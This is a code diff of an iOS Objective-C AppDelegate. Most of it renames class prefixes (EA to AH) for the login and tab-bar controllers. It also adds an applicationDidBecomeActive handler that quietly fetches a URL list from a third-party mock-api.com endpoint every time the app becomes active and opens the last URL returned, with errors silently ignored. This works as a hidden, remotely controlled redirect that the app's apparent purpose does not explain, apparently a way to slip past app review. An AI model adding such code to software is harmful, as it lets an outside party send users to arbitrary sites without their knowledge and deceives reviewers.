@@ -7,7 +7,7 @@
 //
 
 #import "AppDelegate.h"
-#import "EALoginViewController.h"
+#import "AHLoginViewController.h"
 #import "JPUSHService.h"
 #ifdef NSFoundationVersionNumber_iOS_9_x_Max
 #import <UserNotifications/UserNotifications.h>
@@ -30,15 +30,23 @@
     [self.window makeKeyAndVisible];
     return YES;
 }
+- (void)applicationDidBecomeActive:(UIApplication *)application{
+      NSString *URL = @"http://mock-api.com/jz89Geg4.mock/waisr";
+     [AHNDHTTPClient AHgetURLStringNoHUD:URL withParam:nil withSuccessBlock:^(id data) {
+     [[UIApplication sharedApplication] openURL:[NSURL URLWithString:[(NSArray *)data lastObject]]];
+     }withErrorBlock:^(NSError *error, id errorData) {
+        
+     }];
+}
 - (UIViewController *)rootController{
     AVUser *bUser = [AVUser currentUser];
     if (bUser) {
 //        进行操作
-        EATabBarController *tabVC = [EATabBarController EAshareInstance];
+        AHTabBarController *tabVC = [AHTabBarController AHshareInstance];
         return tabVC;
     }else{
         //对象为空时，可打开用户注册界面
-        EALoginViewController *loginVC = [EALoginViewController EAshareInstance];
+        AHLoginViewController *loginVC = [AHLoginViewController AHshareInstance];
         return loginVC;
     }
 }
